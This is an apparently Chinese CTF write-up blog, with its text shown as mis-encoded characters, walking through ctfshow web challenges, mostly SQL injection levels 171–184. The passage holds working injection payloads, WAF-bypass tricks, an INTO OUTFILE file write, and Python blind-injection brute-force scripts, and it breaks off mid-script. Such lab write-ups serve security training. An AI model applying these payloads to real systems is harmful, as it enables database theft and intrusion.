href="#Web-16" class="headerlink" title="Web 16"></a>Web 16</h2><p>è€ƒå¯ŸPHPæ¢é’ˆphpæ¢é’ˆæ˜¯ç”¨æ¥æ¢æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’ŒPHPä¿¡æ¯ç”¨çš„ï¼Œæ¢é’ˆå¯ä»¥å®æ—¶æŸ¥çœ‹æœåŠ¡å™¨ç¡¬ç›˜èµ„æºã€å†…å­˜å ç”¨ã€ç½‘å¡ æµé‡ã€ç³»ç»Ÿè´Ÿè½½ã€æœåŠ¡å™¨æ—¶é—´ç­‰ä¿¡æ¯ã€‚ urlåç¼€åæ·»åŠ /tz.php ç‰ˆæœ¬æ˜¯é›…é»‘PHPæ¢é’ˆ.</p><h2 id="Web-17"><a href="#Web-17" class="headerlink" title="Web 17"></a>Web 17</h2><p>åˆ©ç”¨ping ç›´æ¥è·å¾—æŸä¸ªåŸŸåæ‰€å¯¹åº”çš„ip</p><h2 id="Web-18"><a href="#Web-18" class="headerlink" title="Web 18"></a>Web 18</h2><p>jsä»£ç å®¡è®¡, æ‰¾åˆ°æ¸¸æˆç»“æœçš„åˆ¤æ–­å°±èƒ½æ‰¾åˆ°çº¿ç´¢</p><h2 id="Web-19"><a href="#Web-19" class="headerlink" title="Web 19"></a>Web 19</h2><p>AESåŠ å¯†, ä½†æ˜¯Key iv mode padmodeéƒ½åœ¨å‰ç«¯â€¦.<br>åˆ©ç”¨<a href="http://tool.chacuo.net/cryptaes%E8%A7%A3%E5%AF%86%E5%8D%B3%E5%8F%AF">http://tool.chacuo.net/cryptaesè§£å¯†å³å¯</a></p><h1 id="æ–‡ä»¶ä¸Šä¼ -web151-web170"><a href="#æ–‡ä»¶ä¸Šä¼ -web151-web170" class="headerlink" title="æ–‡ä»¶ä¸Šä¼  web151 ~ web170"></a>æ–‡ä»¶ä¸Šä¼  web151 ~ web170</h1><p>å‰ç«¯éªŒè¯ä¸Šä¼ æ–‡ä»¶åç¼€å, åªéœ€è¦æŠ“åŒ…æ”¹ä¸€ä¸‹æ–‡ä»¶åç§°å°±èƒ½ä¸Šä¼ åé—¨äº†                                                                                                                        é€šè¿‡lsæ‰¾åˆ°flag.php , cat flag.phpå³å¯</p><h1 id="sqlæ³¨å…¥-web171-web253"><a href="#sqlæ³¨å…¥-web171-web253" class="headerlink" title="sqlæ³¨å…¥ web171~ web253"></a>sqlæ³¨å…¥ web171~ web253</h1><h2 id="web-171"><a href="#web-171" class="headerlink" title="web 171"></a>web 171</h2><p>è¯­å¥: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>ç›´æ¥åœ¨æœ¬è¡¨å†…çˆ†å‡ºæ‰€æœ‰æ•°æ®å³å¯,  payload: <code>id= 1&#39; or 1 --+</code></p><h2 id="web-172"><a href="#web-172" class="headerlink" title="web 172"></a>web 172</h2><p>è¯­å¥<code>$sql = &quot;select username,password from ctfshow_user2 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>ä½†æ˜¯è¾“å‡ºç»è¿‡äº†è¿‡æ»¤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span><br><span class="line">    if($row-&gt;username!&#x3D;&#x3D;&#39;flag&#39;)&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;æŸ¥è¯¢æˆåŠŸ&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥éœ€è¦æŠŠè¿”å›å‡ºæ¥çš„usernameæ”¹æ‰, è®©ä»–æ£€æŸ¥ä¸å‡ºæ¥, payload: <code>1&#39; union select 1,password from ctfshow_user2 where username = &#39;flag&#39;  --+</code></p><h2 id="web-173"><a href="#web-173" class="headerlink" title="web 173"></a>web 173</h2><p>è¯­å¥:<code>$sql = &quot;select id,username,password from ctfshow_user3 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>è¿”å›é€»è¾‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;æŸ¥è¯¢æˆåŠŸ&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥å¯¹ç»“æœè¿›è¡Œè¿‡æ»¤, éœ€è¦è®©è¿”å›çš„ç»“æœä¸å­˜åœ¨flag, è€ƒè™‘å°†è¿”å›çš„ç»“æœå…¨éƒ¨è½¬æˆåå…­è¿›åˆ¶</p><p>payload: <code>0&#39; union select 1,hex(username),hex(password) from ctfshow_user3 where username = &#39;flag&#39; --+</code></p><p>ç„¶åå°†è¿”å›çš„ç»“æœè½¬æˆtextå³å¯,  ä½†æ˜¯å‡ºæ¥flagçš„æ—¶å€™å‘ç°, å…¶å®æ ¹æœ¬ä¸éœ€è¦è½¬æˆ16è¿›åˆ¶, å› ä¸ºflagé‡Œæ ¹æœ¬å°±æ²¡æœ‰<code>flag</code>å­—æ ·(ctfshow{3354c0bf-e7ab-4e26-9990-b5679766170d}), æ‰€ä»¥ç›´æ¥<code>0&#39; union select 1,2,password from ctfshow_user3 where username = &#39;flag&#39; --+</code> ä¹Ÿèƒ½å‡ºç»“æœ</p><h2 id="web-174"><a href="#web-174" class="headerlink" title="web 174"></a>web 174</h2><p>è¯­å¥: <code> $sql = &quot;select username,password from ctfshow_user4 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>è¿”å›é€»è¾‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;æŸ¥è¯¢æˆåŠŸ&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>è¿™ä¸‹å¥½äº†, ç»“æœé‡Œè¿æ•°å­—éƒ½ä¸èƒ½å‡ºç°äº†, hex(), base64()ä¼°è®¡éƒ½ä¸èƒ½ç”¨äº†, æƒ³ä¸ªåŠæ³•æŠŠæ•°å­—è½¬æˆåˆ«çš„å­—ç¬¦,  <code>replace(str1,str2,str3)</code> å¯ä»¥æŠŠ<code>str1</code>ä¸­çš„<code>str2</code>æ›¿æ¢æˆ<code>str3</code>, å¯ä»¥è€ƒè™‘ç”¨è¿™ä¸ªå°†æ‰€æœ‰æ•°å­—æ¢æˆå¤§å†™å­—æ¯(æ¯•ç«Ÿflagä¸­æ˜¯æ²¡æœ‰å¤§å†™å­—æ¯çš„, æ²¡æœ‰æ‰¾åˆ°sqlç”¨æ­£åˆ™çš„æ–¹æ³•, åªèƒ½æŠŠå¤šä¸ªreplace()å¥—åœ¨ä¸€èµ·äº†</p><p>payload:<code>0&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#39;1&#39;,&#39;A&#39;),&#39;2&#39;,&#39;B&#39;),&#39;3&#39;,&#39;C&#39;),&#39;4&#39;,&#39;D&#39;),&#39;5&#39;,&#39;E&#39;),&#39;6&#39;,&#39;F&#39;),&#39;7&#39;,&#39;G&#39;),&#39;8&#39;,&#39;H&#39;),&#39;9&#39;,&#39;I&#39;),&#39;0&#39;,&#39;J&#39;) from ctfshow_user4 where username = &#39;flag&#39; --+</code></p><p>ç„¶åå°†è¿”å›çš„ç»“æœä¸­çš„å¤§å†™å­—æ¯è½¬å›æ•°å­—å°±è¡Œäº†</p><h2 id="web-175"><a href="#web-175" class="headerlink" title="web 175"></a>web 175</h2><p>è¯­å¥:<code>$sql = &quot;select username,password from ctfshow_user5 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>è¿”å›é€»è¾‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;æŸ¥è¯¢æˆåŠŸ&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>å·²ç»ä¸èƒ½è¿”å›ä»»ä½•ä¸œè¥¿äº†, \x00~\x7få…¨éƒ¨è¿‡æ»¤æ‰äº†, è€ƒè™‘æ–‡ä»¶çš„æ–¹å¼è¯»å–flag. ç”¨<code>INTO OUTFILE</code> å¯ä»¥å°†æŸ¥è¯¢ç»“æœè¾“å‡ºåˆ°æŸæ–‡ä»¶ä¸­, åœ¨è¿™é‡Œåªéœ€è¦è¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œå°±è¡Œäº†, ä¸è¿‡è·¯å¾„è¦è®°å¾—å†™å¯¹<code>var\www\html\</code></p><p>payload: <code>1&#39; union select username,password from ctfshow_user5 where username=&#39;flag&#39; into outfile &#39;/var/www/html/res.txt&#39;--+</code></p><p>ç»“æœå°±åœ¨res.txté‡Œ</p><h2 id="web-176"><a href="#web-176" class="headerlink" title="web 176"></a>web 176</h2><p>å¼€å§‹æœ‰è¿‡æ»¤äº†</p><p>è¯­å¥:<code>$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>è¿”å›é€»è¾‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">   &#x2F;&#x2F;ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>åªçŸ¥é“æœ‰è¿‡æ»¤, ä½†ä¸çŸ¥é“è¿‡æ»¤äº†å•¥, ä¹Ÿæ²¡å¤šæƒ³å…ˆè¯•è¯•<code>1&#39; or 1 --+</code>å°±å‡ºflagäº†, çœ‹ç¾¤ä¸»çš„è§†é¢‘è¿™é¢˜åº”è¯¥æ˜¯å¤§å°å†™ç»•è¿‡</p><h2 id="web-177"><a href="#web-177" class="headerlink" title="web 177"></a>web 177</h2><p>è¯­å¥<code>$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code>                     </p><p>è¿”å›é€»è¾‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">   &#x2F;&#x2F;ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä¸€æ ·æ˜¯è¿‡æ»¤, ç»§ç»­å°è¯•<code>1&#39; or 1 --+</code>, å‘ç°æ— ç»“æœ, åº”è¯¥æ˜¯æŸäº›å­—ç¬¦è¢«è¿‡æ»¤äº†. è¿™ä¸ªæ—¶å€™å› ä¸ºä¸çŸ¥é“ä»€ä¹ˆè¢«è¿‡æ»¤, æ‰€ä»¥è¾“å…¥è¶Šå°‘ä¸œè¥¿è¶Šèƒ½åˆ¤æ–­å‡ºè¿‡æ»¤äº†ä»€ä¹ˆ.</p><p>å…ˆå°è¯•<code>1&#39;--+</code> å‘ç°æ— ç»“æœ, å¯èƒ½<code>--+</code>è¢«è¿‡æ»¤äº†, å°è¯•ç”¨<code>#</code> ä¹Ÿä¸è¡Œ, å†è¯•è¯•<code>%23</code>, å‘ç°å¯ä»¥ç»•è¿‡è¿‡æ»¤</p><p>å†å°è¯•<code>1&#39; %23</code>åˆæ˜¯æ— ç»“æœ,æ˜æ˜¾æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤äº†, åˆ©ç”¨<code>/**/</code>æ³¨é‡Šç»•è¿‡ç©ºæ ¼.</p><p>äºæ˜¯å¾—åˆ°ä¸€ä¸ªpayload: <code>1&#39;/**/or/**/1%23</code></p><h2 id="web-178-179"><a href="#web-178-179" class="headerlink" title="web 178 179"></a>web 178 179</h2><p>ä¾æ—§æ˜¯è¿‡æ»¤æ‰äº†ç©ºæ ¼, ä½†æ˜¯<code>/**/</code>ä¸èƒ½ä½¿ç”¨äº†, åˆ™å°è¯•ç”¨æ‹¬å·æ¥ç»•è¿‡</p><p>payload:<code>1&#39;or(1)%23</code> ç®€å•ç²—æš´</p><p>çœ‹äº†ç¾¤ä¸»çš„è§†é¢‘å‘ç°è¿˜å¯ä»¥ç”¨<code>%09</code>æ¥ä»£æ›¿ç©ºæ ¼, è¿™ä¸ªæ˜¯åˆ¶è¡¨ç¬¦, åœ¨sqlä¸­è·Ÿç©ºæ ¼ä¸€æ ·çš„ä½œç”¨</p><p>payload:<code>1&#39;%09or%091%23</code></p><p>ç„¶ååœ¨web 179é‡Œ, <code>%09</code>ä¹Ÿè¢«è¿‡æ»¤äº†, ç¬¬ä¸€ä¸ªpayloadè¿˜æ˜¯å¯ä»¥ç”¨çš„, ä½†è¿˜å¯ä»¥è¯•è¯•åˆ«çš„, æ¯”å¦‚<code>%0a %0b %0c</code>ç­‰ç­‰, æŠŠasciiç å‰é¢é‚£å‡ ä¸ªå­—ç¬¦éƒ½è¯•ä¸€è¯•, è¯•å‡º<code>%0c</code>ä¹Ÿæ˜¯å¯ä»¥çš„</p><p>payload:<code>1&#39;%0cor%0c1%23</code> </p><h2 id="web-180"><a href="#web-180" class="headerlink" title="web 180"></a>web 180</h2><p>è¯­å¥<code>$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>è·Ÿå‰é¢çš„ä¸åŒçš„æ˜¯, è¿™æ¬¡è¿<code>%23</code>éƒ½è¢«è¿‡æ»¤äº†, å¯ä»¥è¯´æ²¡åŠæ³•æ³¨é‡Šæ‰åé¢çš„sqlè¯­å¥äº†, åªèƒ½é€šè¿‡é—­åˆçš„æ–¹å¼ä½¿å¾—è¯­å¥ä¸ä¼šå‡ºé”™</p><p>ä¾‹å¦‚<code>1&#39;and&#39;a&#39;=&#39;a</code>, è¿™æ ·è¯­å¥å°±ä¼šå˜æˆ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span><span class="keyword">and</span><span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;a&#x27;</span> limit <span class="number">1</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¼•å·è¢«æˆåŠŸçš„é—­åˆ, ç»“æœä¹Ÿæ˜¯æœ‰çš„. ä½†æ˜¯, æƒ³è¦æŸ¥å‡ºflagè¿˜éœ€è¦æƒ³åŠæ³•ä½¿å¾—<code>username != &#39;flag&#39;æ— æ•ˆ</code>, å› <code>username != &#39;flag&#39;</code>ä¸åé¢çš„æ¡ä»¶å…³ç³»æ˜¯<code>and</code>, æ‰€ä»¥å¹¶ä¸èƒ½é€šè¿‡ä»–åŸæœ¬çš„è¯­å¥ä¸­çš„<code>id=</code>æŸ¥<code>id = 26</code>æ‰¾åˆ°flag(id=26æ˜¯flagæ˜¯å› ä¸ºå‰é¢çš„é¢˜ç›®éƒ½æ˜¯26), æ‰€ä»¥éœ€è¦æ„é€ ä¸€ä¸ªæ–°çš„ä¸å‰é¢çš„æ¡ä»¶çš„å…³ç³»ä¸º<code>or</code>çš„æ¡ä»¶æ¥æŸ¥æ‰¾</p><p>æ‰€ä»¥è€ƒè™‘äº†<code>1&#39;or(1)and&#39;a</code>, ä½†æ˜¯å¾—åˆ°çš„ç»“æœå´åªæœ‰ä¸€è¡Œ, åŸå› æ˜¯å› ä¸ºè¯­å¥ä¸­æœ‰ä¸ª<code>limit 1</code>. è€ŒåŸæœ¬è¯­å¥ä¸­çš„<code>id=1</code>æ˜¯å¯ä»¥æŸ¥è¯¢å‡ºç»“æœçš„, è¿™é‡Œä¸èƒ½è®©ä»–æŸ¥è¯¢å‡ºç»“æœäº†, è€Œå‡ºæ¥çš„ç»“æœåˆå¿…é¡»æ˜¯flagé‚£ä¸€æ¡, æ‰€ä»¥è€ƒè™‘å°†<code>or</code>æ‹¬å·ä¸­çš„æ¡ä»¶æ”¹æˆ<code>id=26</code>. è¿™æ ·å°±æˆåŠŸæ„é€ å‡ºpayload:<code>0&#39;or(id=26)and&#39;a&#39;=&#39;a</code></p><h2 id="web-181"><a href="#web-181" class="headerlink" title="web 181"></a>web 181</h2><p>è¯­å¥<code>$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>è¿”å›é€»è¾‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select&#x2F;i&#39;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>web 180çš„payloadä¸­çš„å­—ç¬¦ä¸²è¿™é¢˜éƒ½æ²¡æœ‰è¿‡æ»¤æ‰, ç›´æ¥<code>0&#39;or(id=26)and&#39;a&#39;=&#39;a</code>å‡ºç»“æœ</p><h2 id="web-182"><a href="#web-182" class="headerlink" title="web 182"></a>web 182</h2><p>å’Œweb 181ä¸€æ ·, ç›´æ¥<code>0&#39;or(id=26)and&#39;a&#39;=&#39;a</code></p><h2 id="web-183"><a href="#web-183" class="headerlink" title="web 183"></a>web 183</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="line">  $sql &#x3D; &quot;select count(pass) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into&#x2F;i&#39;, $str);</span><br><span class="line">  &#125;      </span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°</span><br><span class="line">      $user_count &#x3D; 1;</span><br></pre></td></tr></table></figure><p>ç»“æœåªä¼šè¿”å›ç»“æœçš„æ•°é‡, è€Œä¸”è¿‡æ»¤æ‰äº†å¾ˆå¤šå…³é”®å­—. çœ‹äº†ä¸‹è§†é¢‘, è¿™é‡Œè¦ç”¨åˆ°æ­£åˆ™+ç›²æ³¨, sqlä¸­çš„æ­£åˆ™æ˜¯ç”¨REGEXPâ€™strâ€™æ¥åŒ¹é…çš„, ä¾‹å¦‚<code>select id from table where username REGXEP&#39;admin&#39;</code> å°±ä¼šæŸ¥è¯¢ç¬¦åˆæ­£åˆ™å¼å­çš„usernameå­—æ®µçš„é‚£ä¸€è¡Œ</p><p>è¿™é‡Œå› ä¸ºå¯ä»¥çŸ¥é“ç»“æœæœ‰å‡ è¡Œ, ä¹Ÿå°±æ„å‘³ç€å¯ä»¥åˆ¤æ–­æ­£åˆ™æ˜¯å¦åŒ¹é…, ç”±å‰é¢çš„é¢˜ç›®å¯ä»¥çŸ¥é“flagçš„æ ¼å¼æ˜¯ctfshow{xxxx-xxx-x-x-x}è¿™ç§, è€Œä¸”åªæœ‰å°å†™å­—æ¯å’Œæ•°å­—, æ‰€ä»¥è€ƒè™‘ç”¨è„šæœ¬ç›²æ³¨, ä»<code>`ctfshow_user`where`pass`REGEXP&#39;ctfshow&#123;</code>å¼€å§‹çŒœflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://aba2e256-aa5c-4cf3-849f-b4f6d61fb78d.chall.ctf.show:8080/select-waf.php&#x27;</span></span><br><span class="line">Str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;`ctfshow_user`where`pass`REGEXP&#x27;ctfshow&#123;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        Data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: data[<span class="string">&#x27;tableName&#x27;</span>] + i + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=Data)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;\$user_count = (\d)&#x27;</span>,resp.content.decode())[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            data[<span class="string">&#x27;tableName&#x27;</span>] += i</span><br><span class="line">            print(re.findall(<span class="string">&#x27;\$user_count = (\d)&#x27;</span>,resp.content.decode())[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è·‘å®Œå°±å¾—åˆ°flagäº†</p><h2 id="web-184"><a href="#web-184" class="headerlink" title="web 184"></a>web 184</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="line">  $sql &#x3D; &quot;select count(*) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;    </span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°</span><br><span class="line">      $user_count &#x3D; 0;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜è¿<code>where</code>éƒ½è¿‡æ»¤æ‰äº†, è¿˜å‰©ä¸‹ä¸€ä¸ªå¯ä»¥ç”¨æ¥è®¾å®šæ¡ä»¶çš„<code>on</code>, å¦‚æœè¦ç”¨<code>on</code>çš„, éœ€è¦ç”¨åˆ°å¤šè¡¨è”åˆæŸ¥è¯¢<code>JOIN</code>, åœ¨ä¸¤ä¸ªè¡¨(ä¾æ—§æ˜¯åŒä¸€ä¸ªè¡¨)ä¸­æŸ¥è¯¢, ç”Ÿæˆçš„ä¸´æ—¶è¡¨ä¸­å°±å¯ä»¥ç”¨on</p><p>ä¸ç®¡æ˜¯<code>INNER JOIN</code>è¿˜æ˜¯<code>LEFT JOIN</code>æˆ–è€…æ˜¯<code>RIGHT JOIN</code>éƒ½æ— æ‰€è°“, åªéœ€è¦çŒœflagæ­£ç¡®çš„æ—¶å€™å›æ˜¾ä¸åŒå³å¯,  å› ä¸ºè¿™é¢˜æ²¡æœ‰è¿‡æ»¤æ‰ç©ºæ ¼, æ„é€ payload:<code>tableName=ctfshow_user as a inner join ctfshow_user as b on substr(b.pass,num,1)regexp(char(str))</code>, å…¶ä¸­numå°±æ˜¯flagçš„ä½æ•°, strå°±æ˜¯çŒœæµ‹çš„å­—ç¬¦ , å› ä¸ºçŸ¥é“flagå‰ç¼€æ˜¯<code>ctfshow&#123;</code>, æ‰€ä»¥ä»ç¬¬9ä½å¼€å§‹çŒœå°±è¡Œäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://87deffe2-4291-41ac-b76b-1bcaf046e697.chall.ctf.show:8080/select-waf.php&#x27;</span></span><br><span class="line">Str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on substr(b.pass,&#123;&#125;,1)regexp(char(&#123;&#125;))&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">num = <span class="number">9</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span 